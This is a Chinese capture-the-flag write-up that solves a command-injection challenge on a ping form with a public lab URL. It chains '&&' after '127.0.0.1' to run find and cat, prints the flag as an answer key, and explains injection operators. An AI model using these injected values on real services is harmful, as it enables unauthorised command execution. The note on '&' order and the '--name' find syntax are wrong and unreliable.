### WriteUp

#### 1.题目名称

command_execution

#### 2.难度系数

简单

#### 3.题目来源

Cyberpeace-n3k0

#### 4.题目描述

小宁写了个ping功能,但没有写waf,X老师告诉她这是非常危险的，你知道为什么吗。

![1564998506636](C:\Users\Administrator\Desktop\11-20190805-command_execution\WriteUp\images\1564998506636.png)

http://111.198.29.45:36429/

#### 5.解题步骤

##### 	5.1 打开网址

![1564998555243](C:\Users\Administrator\Desktop\11-20190805-command_execution\WriteUp\images\1564998555243.png)

##### 		5.2 尝试ping 127.0.0.1

![1564998866052](C:\Users\Administrator\Desktop\11-20190805-command_execution\WriteUp\images\1564998866052.png)

##### 5.3ping得通，尝试用&&符号执行多个命令

首先使用ls命令，多出来一个index.php,说明此方法可以

![1564999175596](C:\Users\Administrator\Desktop\11-20190805-command_execution\WriteUp\images\1564999175596.png)

使用find命令查找带有flag的文件，命令：127.0.0.1 && find / -name 'flag.*'

![1564999345730](C:\Users\Administrator\Desktop\11-20190805-command_execution\WriteUp\images\1564999345730.png)

使用cat命令查看flag.txt。命令：127.0.0.1 && cat /home/flag.txt

![1564999431346](C:\Users\Administrator\Desktop\11-20190805-command_execution\WriteUp\images\1564999431346.png)

#### 6.flag值

cyberpeace{fb7c2bcebd0ba5048d4e4f85394fb079}

#### 7.延伸

命令执行漏洞：当应用需要调用一些外部程序去处理内容的情况下，就会用到一些执行系统命令的函数。如PHP中的system，exec，shell_exec等，当用户可以控制命令执行函数中的参数时，将可注入恶意系统命令到正常命令中，造成命令执行攻击。

windows或linux下

```
command1 && command2 先执行command1，如果为真，再执行command2 
command1 | command2 只执行command2 
command1 & command2 先执行command2后执行command1
command1 || command2 先执行command1，如果为假，再执行command2
```

linux常用命令

```
pwd 显示工作路径
cat 用于连接文件并打印到标准输出设备上
ls 查看目录中的文件
ls -l 显示文件和目录的详细信息
ls -a 显示隐藏文件
mkdir 创建目录
rm -f file1 删除一个叫做“file1”的文件
rm -rf dir1 dir2 同时删除两个目录及它们的内容
cp file1 file2 复制一个文件
find 在指定目录下查找文件
grep 查找文件里符合条件的字符串
mount 挂载linux系统外的文件
umount 用于卸载文件系统
chmod 控制文件如何被他人所调用
chown 将指定文件的拥护者改为指定的用户或组
```

```
find / --name flag.txt  在根目录下查找名称为flag.txt的文件
find / --name flag*     在根目录下查找文件名称中含有flag的文件。
```